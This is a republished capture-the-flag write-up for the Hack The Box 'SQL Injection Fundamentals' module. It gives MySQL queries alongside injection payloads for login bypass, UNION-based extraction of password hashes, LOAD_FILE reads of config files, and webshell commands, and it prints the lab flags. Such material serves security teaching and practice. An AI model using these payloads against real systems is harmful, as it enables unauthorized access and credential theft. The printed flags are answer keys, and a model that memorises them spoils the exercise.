# :game_die: Solving SQL Injection Fundamentals HTB CTF

> **Original Source:** [Solving SQL Injection Fundamentals HTB CTF](https://infosecwriteups.com/solving-sql-injection-fundamentals-htb-ctf-cabb0168f61e)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Solving SQL Injection Fundamentals HTB CTF


*Created by Lexica.art*

## Introduction


The SQL Injection Fundamentals CTF challenge focuses on testing your knowledge and skills in SQL injection vulnerabilities and exploiting them to extract information or perform unauthorized actions on a vulnerable web application.

## Challenge 1: Connect to the Database and Find the First Database Name


The challenge requires you to use the MySQL client from the command line to establish a connection to the database.


```
mysql -u root -h 94.237.55.160 -P 44716 -p
Enter password:
Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MariaDB connection id is 7
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| employees |
| information_schema |
| mysql |
| performance_schema |
| sys |
+--------------------+
5 rows in set (0.068 sec)When prompted, enter the password.
```


After successfully connecting to the database, execute the following SQL command to list the databases in the DBMS:


```
MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| employees |
| information_schema |
| mysql |
| performance_schema |
| sys |
+--------------------+
5 rows in set (0.059 sec)

MariaDB [(none)]> use employees;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees |
+----------------------+
| current_dept_emp |
| departments |
| dept_emp |
| dept_emp_latest_date |
| dept_manager |
| employees |
| salaries |
| titles |
+----------------------+
8 rows in set (0.060 sec)

MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name |
+---------+--------------------+
| d009 | Customer Service |
| d005 | Development |
| d002 | Finance |
| d003 | Human Resources |
| d001 | Marketing |
| d004 | Production |
| d006 | Quality Management |
| d008 | Research |
| d007 | Sales |
+---------+--------------------+
9 rows in set (0.059 sec)
```


From the output, the name of the first database is “`employees`.”

## Challenge 2: Find the Department Number for the ‘Development’ Department


Once connected to the database, execute the following SQL commands:


```
MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| employees |
| information_schema |
| mysql |
| performance_schema |
| sys |
+--------------------+
5 rows in set (0.059 sec)

MariaDB [(none)]> use employees;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees |
+----------------------+
| current_dept_emp |
| departments |
| dept_emp |
| dept_emp_latest_date |
| dept_manager |
| employees |
| salaries |
| titles |
+----------------------+
8 rows in set (0.060 sec)

MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name |
+---------+--------------------+
| d009 | Customer Service |
| d005 | Development |
| d002 | Finance |
| d003 | Human Resources |
| d001 | Marketing |
| d004 | Production |
| d006 | Quality Management |
| d008 | Research |
| d007 | Sales |
+---------+--------------------+
9 rows in set (0.059 sec)
```


These commands select the “`employees`” database and fetch all records from the “`departments`” table. From the output, you can identify that the department number for the ‘Development’ department is “`d005`.”

## Challenge 3: Find the Last Name of an Employee


To find the last name of an employee whose first name starts with “`Bar`” and was hired on January 1, 1990.


```
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees |
+----------------------+
| current_dept_emp |
| departments |
| dept_emp |
| dept_emp_latest_date |
| dept_manager |
| employees |
| salaries |
| titles |
+----------------------+
8 rows in set (0.060 sec)

MariaDB [employees]> SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
+-----------+
| last_name |
+-----------+
| Mitchem |
+-----------+
1 row in set (0.080 sec)
```


The output reveals that the last name of the matching employee is “Mitchem.”

## Challenge 4: Count Records Based on Certain Criteria


In this challenge, you need to determine the number of records in the “`titles`” table where the employee number is greater than 10000 or their title does not contain the word “`engineer`.”


Execute the following SQL command to find the count:


```
MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| employees |
| information_schema |
| mysql |
| performance_schema |
| sys |
+--------------------+
5 rows in set (0.068 sec)

MariaDB [(none)]> SELECT COUNT(*) FROM employees.titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
+----------+
| COUNT(*) |
+----------+
| 654 |
+----------+
1 row in set (0.066 sec)
```


The output shows that there are 654 records satisfying the given criteria.

## Challenge 5: Log in as the User ‘tom’


In this challenge, you are required to log in as the user ‘tom’ and find the flag value displayed after a successful login.


To achieve this, execute the following SQL command:


```
tom' or '1'='1
asdfasdfsad

202a1d1a8b195d5e9a57e434cc16000c
```


The provided input exploits a SQL injection vulnerability by injecting a condition that always evaluates to true. Upon successful injection, the system grants access, and the flag value “`202a1d1a8b195d5e9a57e434cc16000c`” is displayed.

## Challenge 6: Log in as a Specific User to Retrieve the Flag


In this challenge, you need to log in as a user with a specific ID (5) to retrieve the flag.


## Get Ahmet Talha Şen’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Execute the following SQL command:


```
'or id=5)#
safdsafsd

cdad9ecdf6f14b45ff5c4de32909caec
```


This input exploits the SQL injection vulnerability to manipulate the query and bypass the authentication process. After successful injection, the system grants access, and the flag value “`cdad9ecdf6f14b45ff5c4de32909caec`” is retrieved.

## Challenge 7: Perform a Union Query on Multiple Tables


To find the number of records returned when performing a ‘Union’ of all records in the ‘employees’ table and all records in the ‘departments’ table, execute the following SQL commands:


```
MariaDB [(none)]> show databases;
+--------------------+
| Database |
+--------------------+
| employees |
| information_schema |
| mysql |
| performance_schema |
| sys |
+--------------------+
5 rows in set (0.067 sec)

MariaDB [(none)]> use employees;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees |
+----------------------+
| current_dept_emp |
| departments |
| dept_emp |
| dept_emp_latest_date |
| dept_manager |
| employees |
| salaries |
| titles |
+----------------------+
8 rows in set (0.058 sec)

MariaDB [employees]> select * from employees;
+--------+------------+--------------+-----------------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date |
+--------+------------+--------------+-----------------+--------+------------+
| 10001 | 1953-09-02 | Georgi | Facello | M | 1986-06-26 |
.
.
.
| 10654 | 1958-05-01 | Sachin | Tsukuda | M | 1997-11-30 |
+--------+------------+--------------+-----------------+--------+------------+
654 rows in set (0.125 sec)

MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name |
+---------+--------------------+
| d009 | Customer Service |
| d005 | Development |
| d002 | Finance |
| d003 | Human Resources |
| d001 | Marketing |
| d004 | Production |
| d006 | Quality Management |
| d008 | Research |
| d007 | Sales |
+---------+--------------------+
9 rows in set (0.060 sec)

MariaDB [employees]> SELECT emp_no,birth_date,first_name,last_name,gender,hire_date FROM employees UNION SELECT dept_no, dept_name,1,1,1,1 FROM departments--;
+--------+--------------------+--------------+-----------------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date |
+--------+--------------------+--------------+-----------------+--------+------------+
| 10001 | 1953-09-02 | Georgi | Facello | M | 1986-06-26 |
.
.
.
| d007 | Sales | 1 | 1 | 1 | 1 |
+--------+--------------------+--------------+-----------------+--------+------------+
663 rows in set (0.122 sec)
```


By using the ‘UNION’ operator, we can combine the result sets of two separate queries. The output shows that there are `663 `records after performing the union.

## Challenge 8: Retrieve the Result of ‘user()’


To extract the result of the ‘`user()`’ function, which displays the current user, execute the following SQL command:


```
cn' UNION select 1,user(),3,4-- -

root@localhost
```


The provided input exploits the SQL injection vulnerability by injecting a UNION query to retrieve the result of the ‘`user()`’ function. The output shows that the current user is “`root@localhost`.”

## Challenge 9: Retrieve the Password Hash for ‘newuser’


To obtain the password hash for the user ‘newuser’ stored in the ‘users’ table in the ‘ilfreight’ database, execute the following SQL command:


```
cn' UNION select 1, username, password, 4 from users--

9da2c9bcdf39d8610954e0e11ea8f45f
```


The input exploits the SQL injection vulnerability by injecting a UNION query to retrieve the username and password fields from the ‘`users`’ table. The output reveals that the password hash for ‘`newuser`’ is “`9da2c9bcdf39d8610954e0e11ea8f45f`.”

## Challenge 10: Discover the Database Password


To find the database password, check the imported PHP page using the following SQL command:


```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4 -- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4 -- -

dB_pAssw0rd_iS_flag!
```


This command exploits the UNION injection vulnerability to retrieve the contents of the “`config.php`” file. The output reveals the database password: “`dB_pAssw0rd_iS_flag`!”

## Challenge 11: Retrieve the Flag using a Webshell


In this challenge, you can utilize a webshell to execute commands and retrieve the flag. Access the webshell using the provided URL and execute the following commands:


```
http://94.237.61.76:42652/shell.php?0=ls

http://94.237.61.76:42652/shell.php?0=pwd

http://94.237.61.76:42652/shell.php?0=/var/www/html

http://94.237.61.76:42652/shell.php?0=/var/www/flag.txt

d2b5b27ae688b6a0f1d21b7d3a0798cd
```


These commands allow you to explore the file system and retrieve the flag value “`d2b5b27ae688b6a0f1d21b7d3a0798cd`.”

## Challenge 12: Skills Assessment — SQL Injection Fundamentals


In this final challenge, you need to assess the web application, exploit vulnerabilities, and find a flag in the root directory of the file system. The provided table displays some data.


To bypass the login, execute the following SQL command:


```
admin' or 1=1--
asdfasdfsad
```


By injecting this input, you exploit the SQL injection vulnerability to bypass the login mechanism.


After successfully bypassing the login, access the following URL to view the contents:


```
<http://94.237.62.82:40414/dashboard/dashboard.php?0=id>
```


The output displays a table with additional data.


To retrieve the flag, execute the following SQL command:


```
'UNION SELECT 1,2,3,4,5-- -
```


```
IP/dashboard/shell.php?0=ls
IP/dashboard/shell.php?0=pwd
IP/dashboard/shell.php?0=ls/
/dashboard/shell.php?0=cat /flag_cae1dadcd174.txt

528d6d9cedc2c7aab146ef226e918396
```


By injecting this input, you exploit the SQL injection vulnerability to manipulate the query and retrieve the flag value “`528d6d9cedc2c7aab146ef226e918396`.”

---

*Originally published on [Medium](https://infosecwriteups.com/solving-sql-injection-fundamentals-htb-ctf-cabb0168f61e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
